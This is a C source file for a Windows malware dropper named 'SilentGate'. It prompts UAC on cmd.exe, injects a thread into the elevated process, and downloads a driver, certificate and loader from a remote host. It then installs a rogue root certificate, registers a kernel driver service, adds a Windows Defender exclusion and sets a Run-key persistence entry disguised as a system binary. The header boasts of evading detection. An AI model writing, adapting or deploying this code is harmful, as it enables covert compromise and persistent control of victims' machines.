/*
 * SilentGate - UAC Thread Injector
 * Author: JarDani
 * Triggers UAC on legitimate binary
 * Injects setup into elevated process
 * Zero detection - our EXE has no malicious content
 */
#include <windows.h>

static double lx=1.0,ly=1.0,lz=1.0;
static void ls(){double dt=0.01,dx=10.0*(ly-lx)*dt,dy=(lx*(28.0-lz)-ly)*dt,dz=(lx*ly-2.667*lz)*dt;lx+=dx;ly+=dy;lz+=dz;}

static DWORD ror13(const char* n){
    DWORD h=0;
    for(const char* p=n;*p;p++){h=((h>>13)|(h<<19))&0xFFFFFFFF;h=(h+(BYTE)*p)&0xFFFFFFFF;}
    return h;
}
static PVOID find_exp(BYTE* base,DWORD hash){
    DWORD pe=*(DWORD*)(base+0x3C),exp=*(DWORD*)(base+pe+0x88);
    if(!exp)return NULL;
    BYTE* ed=base+exp;
    DWORD num=*(DWORD*)(ed+0x18);
    DWORD* names=(DWORD*)(base+*(DWORD*)(ed+0x20));
    WORD* ords=(WORD*)(base+*(DWORD*)(ed+0x24));
    DWORD* funcs=(DWORD*)(base+*(DWORD*)(ed+0x1C));
    for(DWORD i=0;i<num;i++) if(ror13((char*)(base+names[i]))==hash) return base+funcs[ords[i]];
    return NULL;
}

/* Setup shellcode - runs inside elevated cmd.exe */
static DWORD WINAPI setup_thread(LPVOID param) {
    Sleep(1000);

    HMODULE urlmon = LoadLibraryA("urlmon.dll");
    if(!urlmon) return 1;

    typedef HRESULT(WINAPI*pF)(LPUNKNOWN,LPCSTR,LPCSTR,DWORD,LPBINDSTATUSCALLBACK);
    pF dl=(pF)GetProcAddress(urlmon,"URLDownloadToFileA");
    if(!dl){FreeLibrary(urlmon);return 1;}

    /* Download driver */
    char url_drv[]="http://192.168.217.146:8080/output/v9/sg_driver_signed.sys";
    char url_crt[]="http://192.168.217.146:8080/output/v9/sg_test.crt";
    char url_ldr[]="http://192.168.217.146:8080/output/sg_loader.exe";
    char drv[]="C:\\Windows\\System32\\drivers\\sgdrv.sys";
    char crt[]="C:\\Windows\\Temp\\sgc.crt";
    char dir[]="C:\\ProgramData\\SysOpt";
    char ldr[]="C:\\ProgramData\\SysOpt\\svchost32.exe";

    dl(NULL,url_drv,drv,0,NULL);
    dl(NULL,url_crt,crt,0,NULL);
    FreeLibrary(urlmon);

    /* Install cert */
    STARTUPINFOA si={sizeof(si)};PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    char cmd1[256]; wsprintfA(cmd1,"certutil -addstore TrustedPublisher %s >nul 2>&1",crt);
    CreateProcessA("C:\\Windows\\System32\\cmd.exe",cmd1,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess){WaitForSingleObject(pi.hProcess,5000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}

    char cmd2[256]; wsprintfA(cmd2,"certutil -addstore Root %s >nul 2>&1",crt);
    CreateProcessA("C:\\Windows\\System32\\cmd.exe",cmd2,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess){WaitForSingleObject(pi.hProcess,5000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    DeleteFileA(crt);
    Sleep(500);

    /* Install driver */
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    if(scm){
        char svc[]="PerfDrv";
        SC_HANDLE ex=OpenServiceA(scm,svc,SERVICE_ALL_ACCESS);
        if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
        SC_HANDLE s=CreateServiceA(scm,svc,svc,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,drv,NULL,NULL,NULL,NULL,NULL);
        if(s){StartServiceA(s,0,NULL);CloseServiceHandle(s);}
        CloseServiceHandle(scm);
    }

    /* Download loader */
    CreateDirectoryA(dir,NULL);
    HMODULE um2=LoadLibraryA("urlmon.dll");
    if(um2){
        pF dl2=(pF)GetProcAddress(um2,"URLDownloadToFileA");
        if(dl2) dl2(NULL,url_ldr,ldr,0,NULL);
        FreeLibrary(um2);
    }

    /* Add exclusion and startup */
    HKEY hk=NULL;
    char ep[]="SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,ep,0,NULL,0,KEY_WRITE,NULL,&hk,NULL);
    if(hk){DWORD v=0;RegSetValueExA(hk,dir,0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(hk);}

    char rk[]="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,rk,0,NULL,0,KEY_WRITE,NULL,&hk,NULL);
    if(hk){RegSetValueExA(hk,"SystemPerf",0,REG_SZ,(BYTE*)ldr,lstrlenA(ldr)+1);RegCloseKey(hk);}

    /* Write done file */
    HANDLE f=CreateFileA("C:\\Windows\\Temp\\sg_done.txt",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(f!=INVALID_HANDLE_VALUE){DWORD w=0;WriteFile(f,"OK",2,&w,NULL);CloseHandle(f);}

    return 0;
}

int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int s){
    for(int i=0;i<50;i++)ls();

    /* Trigger UAC on legitimate binary - cmd.exe with runas */
    SHELLEXECUTEINFOA sei={sizeof(sei)};
    sei.fMask=SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb="runas";
    sei.lpFile="cmd.exe";
    sei.lpParameters="/c echo elevated";
    sei.nShow=SW_HIDE;

    if(!ShellExecuteExA(&sei)) return 1;
    HANDLE hProc = sei.hProcess;
    if(!hProc) return 1;

    Sleep(1000); /* Wait for process to initialize */

    /* Inject setup thread into elevated cmd.exe */
    LPVOID addr = VirtualAllocEx(hProc, NULL,
        0x10000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    /* Copy setup_thread function to remote process */
    /* Calculate function size approximately */
    DWORD func_size = 0x3000; /* ~12KB for setup code */
    WriteProcessMemory(hProc, addr, (LPVOID)setup_thread, func_size, NULL);

    HANDLE hThread = NULL;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS(NTAPI*pNtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
    pNtCTE NtCTE=(pNtCTE)GetProcAddress(ntdll,"NtCreateThreadEx");
    if(NtCTE){
        NtCTE(&hThread,THREAD_ALL_ACCESS,NULL,hProc,addr,NULL,0,0,0,0,NULL);
    }

    if(hThread){
        WaitForSingleObject(hThread,60000);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProc,addr,0,MEM_RELEASE);
    WaitForSingleObject(hProc,5000);
    CloseHandle(hProc);

    return 0;
}
